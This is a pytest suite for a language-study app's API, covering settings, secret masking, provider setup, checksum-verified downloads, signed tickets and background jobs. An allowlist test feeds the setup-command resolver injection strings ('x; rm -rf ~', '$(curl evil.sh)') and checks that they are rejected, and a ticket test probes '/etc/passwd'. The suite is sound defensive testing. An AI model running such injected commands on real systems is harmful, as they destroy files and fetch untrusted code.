"""API tests for the settings / providers / tickets / jobs / dictionary families.

Everything runs against a throwaway data dir with mock providers enabled, so no test
touches the developer's real database, settings or secret key — and nothing here reaches
the network.

The app is driven through an ASGI transport rather than ``TestClient`` on purpose: the job
routes need the app and the test to share one event loop so a job can be submitted,
observed and cancelled inside a single test.
"""

from __future__ import annotations

import asyncio
import hashlib
import sys
import threading
from collections.abc import AsyncIterator, Iterator
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

import httpx
import pytest

from bandready.server.jobs import job_manager
from bandready.server.tickets import ttl_for, verify_ticket

TOKEN = "test-token-0123456789"
BASE = "http://127.0.0.1"
MASK = "•••• (stored)"


def _reset_process_state() -> None:
    from bandready import dictionary as wordnet
    from bandready.config import reset_settings_cache
    from bandready.db import engine as db_engine
    from bandready.providers import detect as detect_mod
    from bandready.security import secrets as secrets_mod
    from bandready.settings_store import invalidate_cache

    reset_settings_cache()
    invalidate_cache()
    secrets_mod.reset_key_cache()
    detect_mod.invalidate_cache()
    db_engine.reset_engine()
    wordnet.reset()


@pytest.fixture(scope="module")
def app(tmp_path_factory: pytest.TempPathFactory) -> Iterator[Any]:
    from bandready.server.app import create_app, run_startup

    data_dir: Path = tmp_path_factory.mktemp("bandready-api")
    with pytest.MonkeyPatch.context() as mp:
        mp.setenv("BANDREADY_DATA_DIR", str(data_dir))
        mp.setenv("BANDREADY_AUTH_TOKEN", TOKEN)
        mp.setenv("BANDREADY_ENABLE_MOCK", "1")
        _reset_process_state()
        application = create_app()
        run_startup()
        try:
            yield application
        finally:
            job_manager.clear()
    _reset_process_state()


@pytest.fixture
async def client(app: Any) -> AsyncIterator[httpx.AsyncClient]:
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(
        transport=transport,
        base_url=BASE,
        headers={"Authorization": f"Bearer {TOKEN}"},
    ) as ac:
        yield ac


@pytest.fixture(autouse=True)
async def factory_settings(client: httpx.AsyncClient) -> AsyncIterator[None]:
    """Every test starts from factory defaults and leaves them behind."""
    await client.post("/api/v1/settings/reset")
    yield
    await client.post("/api/v1/settings/reset")


# --------------------------------------------------------------------------- settings


async def test_get_settings_returns_the_document(client: httpx.AsyncClient) -> None:
    resp = await client.get("/api/v1/settings")
    assert resp.status_code == 200
    doc = resp.json()
    assert {"version", "llm", "stt", "tts", "vad", "appearance", "study"} <= set(doc)
    assert isinstance(doc["first_run"], bool)
    assert doc["llm"]["preset"] == "ollama"
    assert doc["vad"]["min_volume"] == 0.0


async def test_settings_requires_bearer_auth(app: Any) -> None:
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=app), base_url=BASE
    ) as anon:
        resp = await anon.get("/api/v1/settings")
    assert resp.status_code == 401
    assert resp.json() == {"detail": "unauthorized", "code": "unauthorized"}


async def test_patch_deep_merges_and_masks_secrets(client: httpx.AsyncClient) -> None:
    from bandready.settings_store import load_settings, load_settings_resolved

    resp = await client.patch(
        "/api/v1/settings",
        json={"llm": {"model": "qwen3:32b", "api_key": "sk-super-secret"}},
    )
    assert resp.status_code == 200
    doc = resp.json()

    # The patched keys changed …
    assert doc["llm"]["model"] == "qwen3:32b"
    # … the untouched siblings survived the deep merge …
    assert doc["llm"]["base_url"] == "http://127.0.0.1:11434/v1"
    assert doc["llm"]["params"]["temperature"] == 0.7
    assert doc["stt"]["preset"] == "faster_whisper"
    # … and the plaintext key never leaves the sidecar.
    assert doc["llm"]["api_key"] == MASK
    assert "sk-super-secret" not in resp.text

    stored = load_settings()["llm"]["api_key"]
    assert stored.startswith("enc:v1:")
    assert load_settings_resolved()["llm"]["api_key"] == "sk-super-secret"

    # A follow-up GET reports the same masked view.
    again = (await client.get("/api/v1/settings")).json()
    assert again["llm"]["api_key"] == MASK
    assert again["llm"]["model"] == "qwen3:32b"


async def test_patching_the_mask_sentinel_keeps_the_stored_key(
    client: httpx.AsyncClient,
) -> None:
    from bandready.settings_store import load_settings

    await client.patch("/api/v1/settings", json={"llm": {"api_key": "sk-original"}})
    before = load_settings()["llm"]["api_key"]

    resp = await client.patch(
        "/api/v1/settings", json={"llm": {"api_key": MASK, "model": "llama3.1:8b"}}
    )
    assert resp.status_code == 200
    assert resp.json()["llm"]["model"] == "llama3.1:8b"
    assert load_settings()["llm"]["api_key"] == before


async def test_env_var_keys_are_stored_literally(client: httpx.AsyncClient) -> None:
    from bandready.settings_store import load_settings

    doc = (
        await client.patch(
            "/api/v1/settings", json={"llm": {"api_key": "${OPENROUTER_API_KEY}"}}
        )
    ).json()
    assert doc["llm"]["api_key"] == "${OPENROUTER_API_KEY}"
    assert load_settings()["llm"]["api_key"] == "${OPENROUTER_API_KEY}"


async def test_min_volume_is_clamped(client: httpx.AsyncClient) -> None:
    doc = (await client.patch("/api/v1/settings", json={"vad": {"min_volume": 0.95}})).json()
    assert doc["vad"]["min_volume"] == 0.6


async def test_invalid_values_are_rejected(client: httpx.AsyncClient) -> None:
    resp = await client.patch("/api/v1/settings", json={"vad": {"confidence": 5}})
    assert resp.status_code == 422
    assert resp.json()["code"] == "validation_error"


async def test_unknown_section_is_rejected(client: httpx.AsyncClient) -> None:
    resp = await client.patch("/api/v1/settings", json={"nonsense": {"a": 1}})
    assert resp.status_code == 422
    assert "nonsense" in resp.json()["detail"]


async def test_reset_restores_defaults(client: httpx.AsyncClient) -> None:
    await client.patch("/api/v1/settings", json={"study": {"target_band": 8.5}})
    assert (await client.get("/api/v1/settings")).json()["study"]["target_band"] == 8.5

    resp = await client.post("/api/v1/settings/reset")
    assert resp.status_code == 200
    assert resp.json()["study"]["target_band"] == 7.0
    assert (await client.get("/api/v1/settings")).json()["study"]["target_band"] == 7.0


# --------------------------------------------------------------------------- providers


async def test_presets_include_mocks_when_enabled(client: httpx.AsyncClient) -> None:
    body = (await client.get("/api/v1/providers/presets")).json()
    ids = {p["id"] for p in body["presets"]}
    # One cloud provider and the local engines: OpenRouter covers chat, transcription
    # and speech from a single key, so the branded alternatives were removed.
    assert {"ollama", "openrouter", "kokoro", "faster_whisper"} <= ids
    assert "custom_openai" not in ids and "mlx_whisper" not in ids
    assert {"openai", "groq", "deepseek"}.isdisjoint(ids)
    assert body["mock_enabled"] is True
    assert "mock_llm" in ids  # hidden preset, served because BANDREADY_ENABLE_MOCK=1

    llm_only = (await client.get("/api/v1/providers/presets?modality=stt")).json()
    assert all("stt" in p["modalities"] for p in llm_only["presets"])


async def test_verify_of_an_inprocess_engine_is_offline(client: httpx.AsyncClient) -> None:
    resp = await client.post(
        "/api/v1/providers/verify",
        json={"modality": "tts", "config": {"preset": "kokoro", "engine": "kokoro_onnx"}},
    )
    assert resp.status_code == 200
    body = resp.json()
    assert body["modality"] == "tts"
    assert body["state"] in ("ready", "needs_download")


async def test_verify_rejects_an_unknown_modality(client: httpx.AsyncClient) -> None:
    resp = await client.post("/api/v1/providers/verify", json={"modality": "ocr"})
    assert resp.status_code == 422
    assert resp.json()["code"] == "validation_error"


async def test_setup_for_a_manual_engine_is_display_only(client: httpx.AsyncClient) -> None:
    resp = await client.post("/api/v1/providers/setup/lm_studio", json={})
    assert resp.status_code == 200
    body = resp.json()
    assert body["runnable"] is False
    assert body["kind"] == "manual"
    assert body["url"].startswith("https://")


async def test_setup_of_an_unknown_engine_is_404(client: httpx.AsyncClient) -> None:
    resp = await client.post("/api/v1/providers/setup/rm-rf", json={})
    assert resp.status_code == 404
    assert resp.json()["code"] == "not_found"


async def test_setup_streams_command_output_into_the_job(client: httpx.AsyncClient) -> None:
    """`ollama pull` progress reaches the UI as job progress_pct + detail (03 §6)."""
    from bandready.server.routes.providers import _run_command

    script = "print('pulling manifest'); print('42% of 1.2 GB')"
    job_id = job_manager.submit(
        "provider_setup", lambda jid: _run_command([sys.executable, "-c", script], jid)
    )
    for _ in range(200):
        await asyncio.sleep(0.01)
        if job_manager.get(job_id)["state"] in ("done", "error"):
            break

    job = (await client.get(f"/api/v1/jobs/{job_id}")).json()
    assert job["state"] == "done", job
    assert job["progress_pct"] == 42
    assert "42%" in job["detail"]
    assert job["result"]["output_tail"][0] == "pulling manifest"


async def test_setup_command_failure_becomes_a_provider_error(
    client: httpx.AsyncClient,
) -> None:
    from bandready.server.routes.providers import _run_command

    job_id = job_manager.submit(
        "provider_setup",
        lambda jid: _run_command(
            [sys.executable, "-c", "import sys; print('boom'); sys.exit(3)"], jid
        ),
    )
    for _ in range(200):
        await asyncio.sleep(0.01)
        if job_manager.get(job_id)["state"] in ("done", "error"):
            break

    job = (await client.get(f"/api/v1/jobs/{job_id}")).json()
    assert job["state"] == "error"
    assert job["error"]["code"] == "provider_error"
    assert "status 3" in job["error"]["detail"]


async def test_setup_command_arguments_are_allowlisted() -> None:
    from bandready.server.errors import ApiError
    from bandready.server.routes.providers import SETUP_FLOWS, _resolve_command

    flow = SETUP_FLOWS["ollama"]
    assert _resolve_command(flow, {}) == ["ollama", "pull", "qwen3:14b"]
    assert _resolve_command(flow, {"model": "llama3.1:8b"}) == [
        "ollama", "pull", "llama3.1:8b",
    ]
    with pytest.raises(ApiError):
        _resolve_command(flow, {"model": "x; rm -rf ~"})
    with pytest.raises(ApiError):
        _resolve_command(flow, {"model": "$(curl evil.sh)"})


# --------------------------------------------------------------------------- models


async def test_recommended_models_follow_the_hardware_tier(client: httpx.AsyncClient) -> None:
    body = (await client.get("/api/v1/models/recommended")).json()
    assert body["tier"] in ("8gb", "16gb", "32gb+", "unknown")
    assert body["recommended"]["llm_model"]
    assert body["recommended"]["tts"]["artifact_id"] == "kokoro-v1.0"
    assert body["cloud_alternative"]["scoring_quality"] == "excellent"
    assert {row["tier"] for row in body["tiers"]} == {"8gb", "16gb", "32gb+"}


async def test_downloads_listing_is_empty_on_a_fresh_install(
    client: httpx.AsyncClient,
) -> None:
    body = (await client.get("/api/v1/models/downloads")).json()
    assert body["items"] == []
    states = {a["artifact_id"]: a["state"] for a in body["artifacts"]}
    assert states["kokoro-v1.0"] == "absent"

    installed = (await client.get("/api/v1/models/installed")).json()
    assert installed == []


async def test_download_of_an_unknown_artifact_is_404(client: httpx.AsyncClient) -> None:
    resp = await client.post("/api/v1/models/download", json={"artifact_id": "nope"})
    assert resp.status_code == 404


# --------------------------------------------------------------------------- downloader
#
# The download engine is the riskiest code in this family (resume + streamed sha256 +
# atomic rename), so it is exercised against a real HTTP server that speaks Range.

PAYLOAD = bytes(range(256)) * 512  # 128 KiB, deterministic


class _RangeHandler(BaseHTTPRequestHandler):
    last_range: str | None = None

    def do_GET(self) -> None:
        _RangeHandler.last_range = self.headers.get("Range")
        start = 0
        if self.headers.get("Range", "").startswith("bytes="):
            start = int(self.headers["Range"].split("=", 1)[1].split("-")[0])
            self.send_response(206)
            self.send_header(
                "Content-Range", f"bytes {start}-{len(PAYLOAD) - 1}/{len(PAYLOAD)}"
            )
        else:
            self.send_response(200)
        body = PAYLOAD[start:]
        self.send_header("Accept-Ranges", "bytes")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args: Any) -> None:  # keep pytest output clean
        return


@pytest.fixture(scope="module")
def file_server() -> Iterator[str]:
    server = ThreadingHTTPServer(("127.0.0.1", 0), _RangeHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"http://127.0.0.1:{server.server_address[1]}/weights.bin"
    finally:
        server.shutdown()
        server.server_close()


def _artifact(url: str, sha: str | None) -> dict[str, Any]:
    return {
        "id": "test-artifact",
        "kind": "stt",
        "dest": "test-artifact",
        "files": [{"name": "weights.bin", "size": len(PAYLOAD), "sha256": sha, "url": url}],
    }


async def test_download_verifies_sha256_and_renames_atomically(
    app: Any, file_server: str
) -> None:
    from bandready.server.routes.models import artifact_dir, download_artifact

    artifact = _artifact(file_server, hashlib.sha256(PAYLOAD).hexdigest())
    result = await download_artifact(artifact)

    target = artifact_dir(artifact) / "weights.bin"
    assert result["artifact_id"] == "test-artifact"
    assert target.read_bytes() == PAYLOAD
    assert not (artifact_dir(artifact) / "weights.bin.part").exists()


async def test_download_resumes_from_a_part_file(app: Any, file_server: str) -> None:
    from bandready.server.routes.models import artifact_dir, download_artifact

    artifact = _artifact(file_server, hashlib.sha256(PAYLOAD).hexdigest())
    directory = artifact_dir(artifact)
    directory.mkdir(parents=True, exist_ok=True)
    (directory / "weights.bin").unlink(missing_ok=True)
    (directory / "weights.bin.part").write_bytes(PAYLOAD[:1000])
    _RangeHandler.last_range = None

    await download_artifact(artifact)

    # A Range request was made, and the checksum still matches — which can only happen
    # if the hash was seeded with the bytes already on disk instead of re-downloading.
    assert _RangeHandler.last_range == "bytes=1000-"
    assert (directory / "weights.bin").read_bytes() == PAYLOAD


async def test_download_rejects_a_checksum_mismatch(app: Any, file_server: str) -> None:
    from bandready.server.errors import ApiError
    from bandready.server.routes.models import artifact_dir, download_artifact

    artifact = _artifact(file_server, "00" * 32)
    directory = artifact_dir(artifact)
    (directory / "weights.bin").unlink(missing_ok=True)

    with pytest.raises(ApiError) as caught:
        await download_artifact(artifact)
    assert caught.value.status == 422
    assert "checksum" in caught.value.detail
    assert not (directory / "weights.bin").exists()
    assert not (directory / "weights.bin.part").exists()


# --------------------------------------------------------------------------- tickets


async def test_ticket_issue_and_verify(client: httpx.AsyncClient) -> None:
    resource = "/api/v1/media/listening/ab34f09c.wav"
    resp = await client.post(
        "/api/v1/tickets", json={"audience": "media-read", "resource": resource}
    )
    assert resp.status_code == 201
    body = resp.json()
    # `media-read` is deliberately long-lived (12 h, `tickets.AUDIENCE_TTL`): a listening
    # part is a ~6-minute WAV that the <audio> element re-requests with Range headers for
    # as long as the learner is on the page, and a 60-second ticket expires mid-playback —
    # the range request 401s, the browser reports an opaque response, and the part dies
    # with MEDIA_ERR_NETWORK. Assert against the source of truth rather than a literal, so
    # this test tracks the policy instead of pinning a number that moved without it.
    assert body["expires_in"] == ttl_for("media-read") == 12 * 60 * 60
    # The short default still applies to every other audience.
    assert ttl_for("session-events") == 60
    ticket = body["ticket"]

    assert verify_ticket(ticket, "media-read", resource) is True
    assert verify_ticket(ticket, "media-read", resource + "x") is False
    assert verify_ticket(ticket, "session-events", resource) is False
    assert verify_ticket(ticket + "tamper", "media-read", resource) is False


async def test_ticket_lets_a_urlonly_request_through_the_middleware(app: Any) -> None:
    """A ticket is the only way `<audio>` and WebSocket can authenticate (18 §2)."""
    from bandready.server.tickets import issue_ticket

    ticket = issue_ticket("session-events", "sp_01J8")
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=app), base_url=BASE
    ) as anon:
        without = await anon.get("/api/v1/settings")
        withticket = await anon.get(f"/api/v1/settings?ticket={ticket}")
    assert without.status_code == 401
    # The middleware accepts the signature; the settings route is not ticket-scoped, so
    # what matters here is that the request was authenticated at all.
    assert withticket.status_code == 200


async def test_ticket_validation(client: httpx.AsyncClient) -> None:
    bad_audience = await client.post(
        "/api/v1/tickets", json={"audience": "everything", "resource": "/x"}
    )
    assert bad_audience.status_code == 422

    missing = await client.post("/api/v1/tickets", json={"audience": "media-read"})
    assert missing.status_code == 422

    wrong_shape = await client.post(
        "/api/v1/tickets", json={"audience": "media-read", "resource": "/etc/passwd"}
    )
    assert wrong_shape.status_code == 422


# --------------------------------------------------------------------------- jobs


async def test_job_lifecycle(client: httpx.AsyncClient) -> None:
    """queued/running → visible → cancel → cancelled → second cancel conflicts."""
    started = asyncio.Event()

    async def slow_job(job_id: str) -> dict[str, str]:
        job_manager.set_progress(job_id, 10, "working…")
        started.set()
        await asyncio.sleep(30)
        return {"never": "reached"}

    job_id = job_manager.submit("model_download", slow_job)
    await asyncio.wait_for(started.wait(), timeout=2)

    one = await client.get(f"/api/v1/jobs/{job_id}")
    assert one.status_code == 200
    job = one.json()
    assert job["id"] == job_id
    assert job["kind"] == "model_download"
    assert job["state"] == "running"
    assert job["progress_pct"] == 10
    assert job["detail"] == "working…"

    listing = (await client.get("/api/v1/jobs?kind=model_download")).json()
    assert [j["id"] for j in listing["items"]] == [job_id]
    assert listing["next_cursor"] is None

    other_kind = (await client.get("/api/v1/jobs?kind=writing_eval")).json()
    assert other_kind["items"] == []

    cancel = await client.post(f"/api/v1/jobs/{job_id}/cancel")
    assert cancel.status_code == 202

    for _ in range(50):
        await asyncio.sleep(0.01)
        if job_manager.get(job_id)["state"] == "cancelled":
            break
    assert (await client.get(f"/api/v1/jobs/{job_id}")).json()["state"] == "cancelled"

    again = await client.post(f"/api/v1/jobs/{job_id}/cancel")
    assert again.status_code == 409
    assert again.json()["code"] == "conflict"


async def test_job_failures_become_the_error_envelope(client: httpx.AsyncClient) -> None:
    async def failing(job_id: str) -> None:
        raise RuntimeError("kaboom")

    job_id = job_manager.submit("provider_setup", failing)
    for _ in range(100):
        await asyncio.sleep(0.01)
        if job_manager.get(job_id)["state"] in ("error", "done"):
            break

    job = (await client.get(f"/api/v1/jobs/{job_id}")).json()
    assert job["state"] == "error"
    assert "kaboom" in job["error"]["detail"]
    assert job["error"]["code"] == "job_failed"


async def test_unknown_job_is_404(client: httpx.AsyncClient) -> None:
    resp = await client.get("/api/v1/jobs/job_does_not_exist")
    assert resp.status_code == 404
    assert resp.json()["code"] == "not_found"


async def test_unknown_job_kind_filter_is_rejected(client: httpx.AsyncClient) -> None:
    resp = await client.get("/api/v1/jobs?kind=mining_bitcoin")
    assert resp.status_code == 422


# --------------------------------------------------------------------------- dictionary


async def test_dictionary_never_errors_and_never_downloads_in_tests(
    client: httpx.AsyncClient,
) -> None:
    status = (await client.get("/api/v1/dictionary")).json()
    assert "available" in status

    resp = await client.get("/api/v1/dictionary/mitigate?install_missing=0")
    assert resp.status_code == 200
    body = resp.json()
    assert body["word"] == "mitigate"
    assert isinstance(body["senses"], list)
    assert body["entries"] == body["senses"]

    if not body["available"]:
        # No lexicon on this machine — the contract is a clean, non-error answer.
        assert body["found"] is False
        assert body["senses"] == []
        return

    assert body["found"] is True
    assert body["lemma"] == "mitigate"
    first = body["senses"][0]
    assert {"pos", "definition", "examples", "synonyms"} <= set(first)
    assert first["definition"]

    # Inflected forms lemmatize before the lookup.
    inflected = (await client.get("/api/v1/dictionary/running?install_missing=0")).json()
    assert inflected["found"] is True
    assert inflected["lemma"] == "run"

    missing = (await client.get("/api/v1/dictionary/zzqqxwv?install_missing=0")).json()
    assert missing["found"] is False
    assert missing["senses"] == []


async def test_dictionary_rejects_a_silly_word(client: httpx.AsyncClient) -> None:
    resp = await client.get(f"/api/v1/dictionary/{'a' * 200}?install_missing=0")
    assert resp.status_code == 422
